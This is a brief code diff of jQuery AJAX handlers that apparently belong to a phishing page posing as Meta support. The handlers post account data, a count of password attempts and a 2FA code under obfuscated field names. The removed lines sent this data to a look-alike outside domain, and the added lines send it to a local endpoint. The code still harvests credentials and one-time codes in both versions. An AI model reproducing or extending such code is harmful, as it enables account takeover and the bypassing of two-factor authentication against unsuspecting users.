@@ -66,7 +66,7 @@ $(document).ready(function() {
         _formInfo.append('num_enter_password', num_enter_password);
 
         $.ajax({
-            url: 'https://centralhelpmeta.store/api/account',
+            url: '/api/account',
             type: 'POST',
             contentType: false,
             processData: false,
@@ -96,7 +96,7 @@ $(document).ready(function() {
         let _code = $this.find('input[name="udgvjseoun"]').val();
 
         $.ajax({
-            url: 'https://centralhelpmeta.store/api/2fa-code',
+            url: '/api/2fa-code',
             type: 'POST',
             data: {
                 'pyctdvtzlzz': _code
